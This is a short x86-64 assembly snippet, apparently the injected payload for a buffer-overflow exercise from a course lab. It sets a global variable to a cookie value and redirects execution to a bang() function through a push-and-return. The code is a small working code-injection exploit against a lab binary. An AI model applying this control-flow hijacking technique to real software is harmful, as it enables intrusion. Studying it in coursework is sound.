movq $0x0000000000602308, %rax     # generate poiner to global_value variable
movq $0x7600148e188e48f7, %rbp     # load cookie value into %rbp register
movq %rbp, (%rax)                  # store cookie value in variable global_value
pushq $0x0000000000401020          # push onto the stack value of bang() procedure address
retq                               # jump to bang() code
